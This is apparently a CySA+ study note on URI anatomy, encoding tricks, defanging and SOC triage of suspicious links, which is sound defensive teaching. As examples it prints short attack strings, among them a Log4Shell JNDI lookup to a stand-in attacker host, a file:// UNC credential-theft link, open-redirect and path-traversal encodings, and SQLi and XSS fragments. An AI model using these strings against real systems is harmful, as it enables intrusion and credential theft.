# URI — Uniform Resource Identifier

## What it is

In **Bloodborne**, every Insight you spend at the Hunter's Dream sends you somewhere specific — a chalice dungeon, a boss arena, the Lecture Building. The string of inputs doesn't *fetch* the location; it *names* it. The lamp interprets the name and the world loads around you. Mess up the name — go to the wrong chalice depth — and you walk into Defiled Amygdala when you wanted Pthumeru Ihyll. The address is the contract.

That's exactly what a URI does. A URI is a string that **identifies a resource** — a page, a file, an API endpoint, a phone number, an email address, a mailto link. It doesn't have to be fetchable. It just has to name the thing unambiguously.

Plain English: a URI is the *full name* of something on the internet (or in any addressable system). A URL is the subset of URIs that also tells you **how to retrieve** the thing — protocol, host, path, query, fragment. Every URL is a URI. Not every URI is a URL.

Technical definition (RFC 3986): a URI has the structure `scheme://authority/path?query#fragment`. The **scheme** (http, https, ftp, mailto, tel, data, javascript, file) sets the interpretation rules. The **authority** is usually `userinfo@host:port`. The **path** is the resource location inside that authority. The **query** carries parameters. The **fragment** is a client-side anchor that never leaves the browser — the server never sees it.

For a CySA+ analyst, the URI is the single most common artifact you'll pull apart at 3am. Phishing links, malware C2 callbacks, exfil endpoints, watering-hole redirects, SSRF payloads, log4j JNDI strings — all of them are URIs. If you can't read a URI like a sentence, you can't triage.

## Why it matters

CS0-003 Objective 1.3 explicitly lists **embedded links**, **email analysis**, and **interpreting suspicious commands** under malicious-activity determination. The URI is where those three converge. A phishing email lives or dies on whether the analyst correctly parses the link the user clicked. A C2 beacon lives or dies on whether the SOC recognizes the callback URI as anomalous against baseline traffic.

Career relevance: every L1 ticket about a suspicious email becomes a URI-decoding exercise. You will defang URIs (`hxxps://evil[.]com/path`) before pasting them into reports a hundred times a year. You will explain to a director why `paypa1.com` is not `paypal.com`. You will argue with a developer about why their app accepts `javascript:` in a redirect parameter.

## Key facts

### URI anatomy

```
 https :// alice : pw @ login.bank.com : 8443 / auth/login ? user=bob&id=42 # section2
 [---]    [---] [-] [----------------] [--] [----------]  [-------------]  [------]
 scheme  userinfo  host             port    path           query           fragment
         └──────── authority ────────────┘
```

| Component | Purpose | Trap |
|-----------|---------|------|
| **Scheme** | How to interpret the rest | `javascript:`, `data:`, `file:` are weaponizable |
| **Userinfo** | Legacy auth field | `http://paypal.com@evil.com/` — host is `evil.com`, not paypal |
| **Host** | DNS name or IP | Punycode (`xn--`), IDN homographs, IP-as-decimal (`http://3232235521/`) |
| **Port** | TCP port | Non-standard ports (8443, 4444, 8080) on user traffic = check |
| **Path** | Resource locator | Path traversal (`../`), encoded slashes (`%2f`) |
| **Query** | Parameters | Open redirects, SSRF targets, base64 payloads |
| **Fragment** | Client-side only | Never logged server-side — DOM-based XSS lives here |

### URI vs URL vs URN

CompTIA likes the distinction:

- **URI** — identifier. The umbrella term. Names a resource.
- **URL** — locator. A URI that includes *how to retrieve*. Has a scheme like `https`, `ftp`, `file`.
- **URN** — name. A URI that names without locating. Example: `urn:isbn:0451450523`. You can't fetch it; you can only refer to it.

> **CompTIA exam trap:** if the question shows `https://example.com/index.html`, it is both a URI and a URL. If the question shows `urn:ietf:rfc:3986`, it is a URI but **not** a URL. If forced to pick one, "URI" is always correct for any of these; "URL" is correct only when a scheme defines retrieval.

### Schemes you'll see in malicious traffic

| Scheme | What it does | SOC concern |
|--------|--------------|-------------|
| `http` / `https` | Web fetch | Baseline — but check destination, port, TLS cert |
| `ftp` / `sftp` | File transfer | Exfil channel |
| `file://` | Local file | SMB credential theft via UNC paths on Windows (`file://attacker/share`) |
| `javascript:` | Inline JS execution | Bookmarklet abuse, reflected XSS payload |
| `data:` | Inline content (often base64) | Phishing pages encoded directly in URL, evades URL reputation |
| `mailto:` | Compose email | Pre-filled phishing reply addresses |
| `ldap://` / `rmi://` / `dns://` | Log4Shell territory | JNDI lookup callbacks — `${jndi:ldap://attacker/x}` |
| `tel:` / `sms:` | Phone hooks | Vishing pivots from email |

### Encoding — the analyst's nemesis

URIs only allow a defined character set (RFC 3986). Everything else gets **percent-encoded**: a byte becomes `%` followed by two hex digits. Space = `%20`. Slash = `%2F`. Newline = `%0A`. Attackers stack encodings — URL-encode a URL-encoded payload — to slip past naive WAF regex.

Common evasions to recognize on sight:

```
%2e%2e%2f             →  ../              path traversal
%252e%252e%252f       →  %2e%2e%2f → ../  double encoding
%u002e%u002e          →  ..               IIS Unicode (legacy)
&#x2e;&#x2e;&#x2f;    →  ../              HTML entity
@                     →  authority hijack via userinfo
```

> **CompTIA exam trap:** the question gives you `http://victim.com/page?next=http%3A%2F%2Fattacker.com`. The `next=` parameter is a URL-encoded URL. Decoded, it's `http://attacker.com`. The attack is **open redirect**. CompTIA tests whether you recognize the encoded payload, not whether you can decode it by hand — but you'll need to do it by hand on the job.

### Defanging — the SOC etiquette rule

Never paste a live malicious URI into a ticket, chat, or email without **defanging** it. Standard defangs:

- `http` → `hxxp`
- `.` → `[.]` (especially in host and TLD)
- `://` → `[://]`

`https://malware.evil.com/payload.exe` becomes `hxxps[://]malware[.]evil[.]com/payload[.]exe`. This prevents accidental clicks, prevents auto-link-preview tools from reaching out and tipping the attacker that you're investigating, and prevents your DLP from flagging your own ticket.

### What to extract from a suspicious URI

In your IR notes, capture every layer separately:

1. **Scheme** — anything non-http/https deserves a second look
2. **Host** — resolve to IP, run [[WHOIS]] for registration date and registrar, run [[AbuseIPDB]] for reputation
3. **Domain age** — registered in the last 30 days is a red flag (newly-registered domains, NRDs)
4. **TLS cert** — Let's Encrypt + new domain + brand keyword = phishing-kit pattern
5. **Path** — does it match a known kit? `/login.php?email=` + brand logo = credential harvester
6. **Query parameters** — base64 chunks, encoded URLs, victim identifiers
7. **Reputation** — [[VirusTotal]] URL scan, threat intel feeds
8. **Sandbox detonation** — [[Cuckoo Sandbox]] or [[Joe Sandbox]] for full behavior chain

### Tools you'll actually use

- **`curl -I`** — HEAD request, see redirects without executing JS
- **CyberChef** — paste URI, chain `URL Decode` → `From Base64` → `Defang URL` recipes
- **[[Wireshark]]** — pull URIs out of HTTP requests in [[Packet capture]]
- **`grep -oE 'https?://[^[:space:]"]+' file.eml`** — extract URIs from raw email (a [[Regular expressions]] one-liner)
- **[[Strings]]** on a binary — pull hardcoded C2 URIs straight out of malware
- **WHOIS / passive DNS** — pivot from URI host to other indicators
- **VirusTotal, urlscan.io, AbuseIPDB** — reputation pivots

A Python snippet you'll write a hundred times:

```python
from urllib.parse import urlparse, parse_qs, unquote
u = urlparse("https://a.com/p?next=" + "...")
print(u.scheme, u.netloc, u.path)
print(parse_qs(u.query))
print(unquote(u.query))  # peel one encoding layer
```

### URI in email headers and authentication

Phishing analysis is a URI exercise. The visible `<a href="...">` doesn't have to match the link text. CompTIA loves this: the email says `Click here to visit paypal.com` but the href is `https://paypa1-secure[.]com/login`. Always pull the raw href out of the email source, not what the rendered client shows you.

Email authentication ([[SPF]], [[DKIM]], [[DMARC]]) tells you if the sending domain is legitimate. **It tells you nothing about the URIs inside the body.** A DMARC-passing email from a compromised legitimate account can contain a malicious URI and arrive perfectly authenticated. Don't conflate the two checks.

> **CompTIA exam trap:** the email passes SPF, DKIM, and DMARC, yet contains a malicious link. CompTIA wants you to recognize that **authentication checks the envelope, not the contents**. The defense for malicious URIs is URL rewriting / URL reputation / sandbox detonation — not email authentication.

### Common attack patterns embedded in URIs

| Pattern | URI signature |
|---------|--------------|
| **Open redirect** | `?next=`, `?redirect=`, `?url=`, `?return=` containing an external URL |
| **SSRF** | Internal host or `169.254.169.254` (cloud metadata) in a server-side parameter |
| **SQLi** | `' OR 1=1--`, `UNION SELECT`, URL-encoded variants in query |
| **XSS** | `<script>`, `onerror=`, encoded `<` (`%3C`) in query or fragment |
| **Path traversal** | `../`, `%2e%2e%2f`, deeply nested encodings |
| **Log4Shell / JNDI** | `${jndi:ldap://...}` in User-Agent, X-Forwarded-For, any logged field |
| **C2 beacon** | Long pseudo-random path, regular timing, unusual TLD (`.xyz`, `.top`, `.tk`) |

## SOC reality

- The 3am alert is rarely "URI looks malicious" — it's "user clicked link, EDR fired on the second-stage download." Your job is to walk the URI chain backward: the email, the redirect, the landing page, the payload host, the C2.
- L1 first action: **defang and document**. Pull the raw URI from the email source or proxy log. Defang it in the ticket. Run it through VirusTotal and urlscan.io. Check WHOIS for domain age. Never click. Never `curl` from a workstation that resolves DNS the same way users do — use a sandbox VM or detonation service.
- The CISO asks three things: **who clicked, what they entered, what reached out after**. The URI tells you the first; credential telemetry tells you the second; egress logs and EDR process trees tell you the third.
- Never promise leadership "the link is blocked" until the URL is in the proxy blocklist *and* the parent domain is sinkholed *and* you've checked for typosquats. The attacker rotates URIs faster than your blocklist updates.
- Handoff point: if the URI hosts a credential harvester and any user submitted, this becomes an [[Incident response]] case — credential reset, MFA enforcement, session token revocation, and a sweep of [[Impossible travel]] alerts for the affected accounts.

## Related concepts

[[URL]] · [[DNS]] · [[WHOIS]] · [[VirusTotal]] · [[AbuseIPDB]] · [[Phishing]] · [[Email analysis]] · [[SPF]] · [[DKIM]] · [[DMARC]] · [[Embedded links]] · [[Open redirect]] · [[SSRF]] · [[XSS]] · [[Path traversal]] · [[Log4Shell]] · [[Punycode]] · [[Defanging]] · [[CyberChef]] · [[Regular expressions]] · [[Joe Sandbox]] · [[Cuckoo Sandbox]] · [[Command and control]]

*Source: VIRGIL knowledge base — 2026-05-11*